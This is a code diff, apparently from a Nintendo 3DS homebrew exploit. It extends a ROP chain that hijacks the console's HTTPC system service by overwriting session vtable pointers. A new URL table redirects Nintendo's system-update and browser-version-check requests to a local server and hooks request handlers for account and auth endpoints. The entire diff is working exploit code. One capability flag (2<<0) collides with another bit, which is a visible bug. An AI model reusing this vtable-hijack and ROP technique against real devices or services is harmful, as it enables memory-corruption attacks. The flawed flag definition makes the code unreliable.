@@ -78,12 +78,48 @@ u32 ropvmem_size = 0x4000;
 u32 httpheap_size = 0x22000;
 
 static u32 __custom_mainservsession_vtable;
-static u32 __custom_contextservsession_vtable;
 static u32 condcallfunc_objaddr;
 
 static u32 __httpmainthread_cmdhandler_stackframe = 0x0ffffe28;
 
 static u32 ropheap = 0x0ffff000;//Main-thread stack-bottom.
+
+typedef enum {
+	TARGETURLCAP_AddRequestHeader = 1<<0, //Override the value-data used for certain headers.
+	TARGETURLCAP_AddPostDataAscii = 1<<1, //Override the value-data used for certain form-fields.
+	TARGETURLCAP_SendPOSTDataRawTimeout = 2<<0, //NOP SendPOSTDataRawTimeout.
+} targeturl_caps;//Bitmask of capabilities, 0 = none(vtable-ptr is left at the original one).
+
+typedef struct {
+	targeturl_caps caps;
+	u32 vtableptr;
+	u32 *vtable_sharedmemptr;
+	char url[0x100];//Target URL to compare the CreateContext input URL with. The compare will not include the NUL-terminator in this target URL, hence the check will pass when there's additional chars following the matched URL. This is needed due to the multiple account.nintendo.net URLs that need targeted + handled all the same way.
+	char new_url[0x100];//Optional, when set the specified URL will overwrite the URL used with CreateContext, NUL-terminator included.
+} targeturlctx;
+
+targeturlctx targeturl_list[] = {
+	{//This is the URL used for doing the actual sysupdate check / getting the the list of sysupdate titles.
+		.caps = TARGETURLCAP_SendPOSTDataRawTimeout,
+		.url = "https://nus.c.shop.nintendowifi.net/nus/services/NetUpdateSOAP",
+		.new_url = "http://10.0.0.30/ctr-httpwn/NetUpdateSOAP"
+	},
+
+	{//NNID
+		.caps = TARGETURLCAP_AddRequestHeader,
+		.url = "https://account.nintendo.net/"
+	},
+
+	{//Used by friends-sysmodule and AC-sysmodule, however it's unknown if AC ever runs the code for it.
+		.caps = TARGETURLCAP_AddRequestHeader | TARGETURLCAP_AddPostDataAscii,
+		.url = "https://nasc.nintendowifi.net/ac"
+	},
+
+	{//Browser-version-check.
+		.url = "https://cbvc.cdn.nintendo.net/",
+		.new_url = "http://10.0.0.30/ctr-httpwn/cbvc"//Just a static page returning '0'.
+	}
+};
 
 void ropgen_addword(u32 **ropchain, u32 *http_ropvaddr, u32 value)
 {
@@ -514,7 +550,7 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 Result setuphaxx_httpheap_sharedmem()
 {
-	u32 pos;
+	u32 pos, i;
 
 	u32 *ropchain = (u32*)ropvmem_sharedmem;
 	u32 ropvaddr = ropvmem_base;
@@ -539,14 +575,35 @@ Result setuphaxx_httpheap_sharedmem()
 
 	u32 *condcallfunc_objaddr_sharedmemptr = NULL;
 	u32 *__custom_mainservsession_vtable_sharedmemptr = NULL;
-	u32 *__custom_contextservsession_vtable_sharedmemptr = NULL;
+
+	u32 targeturl_list_vaddr;
+	u32 *targeturl_list_sharedmemptr = NULL;
+	u32 targeturl_list_size, targeturl_list_entcount;
+	targeturl_caps tmpcaps;
 
 	mainrop_endaddr = ropvmem_base + ropvmem_size;
 
 	condcallfunc_objaddr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &condcallfunc_objaddr_sharedmemptr, 0x8);
 
 	__custom_mainservsession_vtable = memalloc_ropvmem_dataheap(&mainrop_endaddr, &__custom_mainservsession_vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
-	__custom_contextservsession_vtable = memalloc_ropvmem_dataheap(&mainrop_endaddr, &__custom_contextservsession_vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
+
+	targeturl_list_size = sizeof(targeturl_list);
+	targeturl_list_entcount = targeturl_list_size / sizeof(targeturlctx);
+	targeturl_list_vaddr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &targeturl_list_sharedmemptr, targeturl_list_size);
+
+	for(pos=0; pos<targeturl_list_entcount; pos++)
+	{
+		if(targeturl_list[pos].caps==0)continue;
+
+		targeturl_list[pos].vtableptr = memalloc_ropvmem_dataheap(&mainrop_endaddr, &targeturl_list[pos].vtable_sharedmemptr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
+		
+		for(i=0; i<targeturl_list_entcount; i++)
+		{
+			if(pos==i || targeturl_list[pos].caps != targeturl_list[i].caps)continue;
+
+			targeturl_list[i].vtableptr = targeturl_list[pos].vtableptr;//Don't copy vtable_sharedmemptr since that would result in initializing the vtable memory multiple times below.
+		}
+	}
 
 	//Setup the ROP-chain used by the vtable funcptrs from the end of this function.
 
@@ -638,7 +695,7 @@ Result setuphaxx_httpheap_sharedmem()
 
 	ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
 	ropgen_movr1r0(&ropchain, &ropvaddr);
-	ropgen_writeu32(&ropchain, &ropvaddr, __custom_contextservsession_vtable, 0, 0);//Overwrite the vtable for the above object.
+	ropgen_writeu32(&ropchain, &ropvaddr, targeturl_list[2].vtableptr, 0, 0);//Overwrite the vtable for the above object. TODO: Select which vtable to use via checking URLs stored in the targeturl_list.
 
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_RETURN, __httpmainthread_cmdhandler_stackframe-4, 1);
 
@@ -674,19 +731,28 @@ Result setuphaxx_httpheap_sharedmem()
 	ptr[0] = condcallfunc_objaddr + 0x4 - 0xcc;//Setup the vtable ptr so that the funcptr is loaded from the below word.
 	ptr[1] = ROP_POPPC;
 
-	//Setup the custom vtable for main serv session.
+	//Setup the custom vtable for main serv sessions.
 	ptr = __custom_mainservsession_vtable_sharedmemptr;
 	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
 	ptr[0x8>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//Overwrite the vtable funcptr for CreateContext.
 
-	//Setup the custom vtable for context-session.
-	ptr = __custom_contextservsession_vtable_sharedmemptr;
-	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
-	//Overwrite the vtable funcptrs.
-	//ptr[0x6c>>2] = 0x80808080;//ReceiveDataTimeout. This is called from the same seperate thread as CloseContext.
-	ptr[0x80>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//AddRequestHeader. This is called from the main-thread.
-	ptr[0x84>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//AddPostDataAscii. This is called from the main-thread.
-	//ptr[0xa8>>2] = ROP_MOVR0_VAL0_BXLR;//SendPOSTDataRawTimeout. This is called from the same seperate thread as CloseContext. With this HTTPC:SendPOSTDataRawTimeout will just return 0 without doing anything, hence the specified POST data will not be uploaded.
+	//Setup the custom vtables for context-sessions.
+	for(pos=0; pos<targeturl_list_entcount; pos++)
+	{
+		ptr = targeturl_list[pos].vtable_sharedmemptr;
+		if(ptr==NULL)continue;
+
+		tmpcaps = targeturl_list[pos].caps;
+
+		memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
+		//Overwrite the vtable funcptrs.
+		//ptr[0x6c>>2] = 0x80808080;//ReceiveDataTimeout. This is called from the same seperate thread as CloseContext.
+		if(tmpcaps & TARGETURLCAP_AddRequestHeader)ptr[0x80>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//AddRequestHeader. This is called from the main-thread.
+		if(tmpcaps & TARGETURLCAP_AddPostDataAscii)ptr[0x84>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//AddPostDataAscii. This is called from the main-thread.
+		if(tmpcaps & TARGETURLCAP_SendPOSTDataRawTimeout)ptr[0xa8>>2] = ROP_MOVR0_VAL0_BXLR;//SendPOSTDataRawTimeout. This is called from the same seperate thread as CloseContext. With this HTTPC:SendPOSTDataRawTimeout will just return 0 without doing anything, hence the specified POST data will not be uploaded.
+	}
+
+	memcpy(targeturl_list_sharedmemptr, targeturl_list, targeturl_list_size);
 
 	//Overwrite every main-serv-sesssion httpc_cmdhandler object *(_this+16) vtable ptr with the custom one.
 
